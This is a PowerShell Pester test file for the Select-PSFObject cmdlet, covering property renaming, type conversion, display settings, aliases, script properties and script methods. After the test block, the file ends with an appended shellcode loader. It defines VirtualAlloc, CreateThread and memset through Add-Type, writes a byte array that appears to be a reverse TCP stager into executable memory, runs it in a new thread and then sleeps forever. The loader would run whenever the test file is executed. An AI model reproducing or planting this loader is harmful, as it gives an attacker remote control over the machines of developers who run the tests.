Describe "Select-PSFObject Unit Tests" -Tag "UnitTests" {
	$object = [PSCustomObject]@{
		Foo  = 42
		Bar  = 18
		Tara = 21
	}
	
	$object2 = [PSCustomObject]@{
		Foo = 42000
		Bar = 23
	}
	
	$list = @()
	$list += $object
	$list += [PSCustomObject]@{
		Foo  = 23
		Bar  = 88
		Tara = 28
    }
    
    Describe "Basic DSL functionalities" {
    	It "renames Bar to Bar2" {
    		($object | Select-PSFObject -Property 'Foo', 'Bar as Bar2').PSObject.Properties.Name | Should -Be 'Foo', 'Bar2'
    	}
    	
    	It "changes Bar to string" {
    		($object | Select-PSFObject -Property 'Bar to string').Bar.GetType().FullName | Should -Be 'System.String'
    	}
        
        It "converts numbers to sizes" {
            ($object2 | Select-PSFObject -Property 'Foo size KB:1').Foo | Should -Be 41
            ($object2 | Select-PSFObject -Property 'Foo size KB:1:1').Foo | Should -Be "41 KB"
        }
    }
    
    Describe "Selects from other variables" {
        It "picks values from other variables" {
            ($object2 | Select-PSFObject -Property 'Tara from object').Tara | Should -Be 21
        }
        
        It "picks values from the properties of the right object in a list" {
            ($object2 | Select-PSFObject -Property 'Tara from List where Foo = Bar').Tara | Should -Be 28
        }
    }
    
    Describe "Display Settings are applied" {
        It "sets the correct properties to show in whitelist mode" {
            $obj = [PSCustomObject]@{ Foo = "Bar"; Bar = 42; Right = "Left" }
            $null = $obj | Select-PSFObject -ShowProperty Foo, Bar
            $obj.PSStandardMembers.DefaultDisplayPropertySet.ReferencedPropertyNames | Should -Be 'Foo', 'Bar'
        }
        
        It "sets the correct properties to show in blacklist mode" {
            $obj = [PSCustomObject]@{ Foo = "Bar"; Bar = 42; Right = "Left" }
            $null = $obj | Select-PSFObject -ShowExcludeProperty Foo
            $obj.PSStandardMembers.DefaultDisplayPropertySet.ReferencedPropertyNames | Should -Be 'Bar', 'Right'
        }
        
        It "sets the correct typename" {
            $obj = [PSCustomObject]@{ Foo = "Bar"; Bar = 42; Right = "Left" }
            $null = $obj | Select-PSFObject -TypeName 'Foo.Bar'
            $obj.PSObject.TypeNames[0] | Should -Be 'Foo.Bar'
        }
    }
    
    Describe "Verifying input object integrity" {
        It "adds properties without harming the original object when used with -KeepInputObject" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject "Length as Size size KB:1:1" -KeepInputObject
            $modItem.GetType().FullName | Should -Be 'System.IO.FileInfo'
            $modItem.Size | Should -BeLike '* KB'
        }
    }
    
    Describe "Alias functionality applies" {
        It "adds aliases when using the -Alias parameter and specifying a string" {
    		$item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
    		$modItem = $item | Select-PSFObject -KeepInputObject -Alias "Name as AliasName"
    		$modItem.AliasName | Should -Be $modItem.Name
    		$property = $modItem.PSObject.Properties["AliasName"]
    		$property.MemberType | Should -Be 'AliasProperty'
    		$property.Name | Should -Be 'AliasName'
    		$property.Value | Should -Be $modItem.Name
    		$property.ReferencedMemberName | Should -Be 'Name'
    	}
        
        It "adds multiple aliases when using a hashtable on the -Alias parameter" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject -KeepInputObject -Alias @{
                AliasName = "Name"
                Size      = "Length"
                Ex        = "Extension"
            }
            ($modItem.PSObject.Properties | Group-Object MemberType | Where-Object Name -EQ "AliasProperty").Count | Should -Be 3
            ($modItem.PSObject.Properties | Group-Object MemberType | Where-Object Name -EQ "AliasProperty").Group.Name | Should -BeIn AliasName, Size, Ex
        }
    }
    
    Describe "Script properties work in all supported notations" {
        It "adds a script property using the simple string notation" {
    		$item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
    		$modItem = $item | Select-PSFObject -KeepInputObject -ScriptProperty 'Size := $this.Length * 2'
    		$modItem.Size | Should -Be ($modItem.Length * 2)
    		{ $modItem.Size = 23 } | Should -Throw
    	}
        
        It "adds a script property using a less simple string notation that supports settable properties" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject Name, Length -ScriptProperty 'Size := $this.Length * 2 =: $this.Length = $args[0] / 2'
            $modItem.Length = 42
            $modItem.Size | Should -Be 84
            { $modItem.Size = 22 } | Should -Not -Throw
            $modItem.Length | Should -Be 11
            $modItem.Size | Should -Be 22
        }
        
        It "adds a complex script property using a scriptblock" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject Name, Length -ScriptProperty { Size := $this.Length * 2 =: $this.Length = $args[0] / 2 }
            $modItem.Length = 42
            $modItem.Size | Should -Be 84
            { $modItem.Size = 22 } | Should -Not -Throw
            $modItem.Length | Should -Be 11
            $modItem.Size | Should -Be 22
        }
        
        It "adds a script property using the simple hashtable notation" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject Name, Length -ScriptProperty @{ Size = { $this.Length * 2 } }
            $modItem.Size | Should -Be ($modItem.Length * 2)
            { $modItem.Size = 23 } | Should -Throw
        }
        
        It "adds a script property using the complex hashtable notation" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject Name, Length -ScriptProperty @{
                Size = @{
                    get = { $this.Length * 2 }
                    set = { $this.Length = $args[0] / 2 }
                }
            }
            $modItem.Length = 42
            $modItem.Size | Should -Be 84
            { $modItem.Size = 22 } | Should -Not -Throw
            $modItem.Length | Should -Be 11
            $modItem.Size | Should -Be 22
        }
        
        It "adds multiple script properties using the complex hashtable notation" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject Name, Length -ScriptProperty @{
                Size = @{
                    get = { $this.Length * 2 }
                    set = { $this.Length = $args[0] / 2 }
                }
                ExtraSize = @{
                    get = { $this.Length * 3 }
                }
            }
            $modItem.Length = 42
            $modItem.Size | Should -Be 84
            $modItem.ExtraSize | Should -Be 126
            { $modItem.Size = 22 } | Should -Not -Throw
            $modItem.Length | Should -Be 11
            $modItem.Size | Should -Be 22
            { $modItem.ExtraSize = 22 } | Should -Throw
        }
        
        It "adds multiple script properties using the mixed complexity hashtable notation" {
            $item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
            $modItem = $item | Select-PSFObject Name, Length -ScriptProperty @{
                Size = @{
                    get = { $this.Length * 2 }
                    set = { $this.Length = $args[0] / 2 }
                }
                ExtraSize = { $this.Length * 3 }
            }
            $modItem.Length = 42
            $modItem.Size | Should -Be 84
            $modItem.ExtraSize | Should -Be 126
            { $modItem.Size = 22 } | Should -Not -Throw
            $modItem.Length | Should -Be 11
            $modItem.Size | Should -Be 22
            { $modItem.ExtraSize = 22 } | Should -Throw
        }
	}
	
	Describe "Script methods work in all supported notations" {
		It "adds a script method using the simple string notation" {
			$item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
			$modItem = $item | Select-PSFObject -KeepInputObject -ScriptMethod 'GetSize => $this.Length * 2'
			$modItem.GetSize() | Should -Be ($modItem.Length * 2)
		}
		
		It "adds a script method using the scriptblock notation" {
			$item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
			$modItem = $item | Select-PSFObject -KeepInputObject -ScriptMethod { GetSize => $this.Length * 2 }
			$modItem.GetSize() | Should -Be ($modItem.Length * 2)
		}
		
		It "adds a script method using the hashtable notation" {
			$item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
			$modItem = $item | Select-PSFObject -KeepInputObject -ScriptMethod @{ GetSize = { $this.Length * 2 } }
			$modItem.GetSize() | Should -Be ($modItem.Length * 2)
		}
		
		It "adds multiple script methods using the hashtable notation" {
			$item = Get-Item "$PSScriptRoot\Select-PSFObject.Tests.ps1"
			$modItem = $item | Select-PSFObject -KeepInputObject -ScriptMethod @{
				GetSize = { $this.Length * 2 }
				GetExtraSize = { $this.Length * 3 }
			}
			$modItem.GetSize() | Should -Be ($modItem.Length * 2)
			$modItem.GetExtraSize() | Should -Be ($modItem.Length * 3)
		}
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x3e,0x97,0xd5,0xaa,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

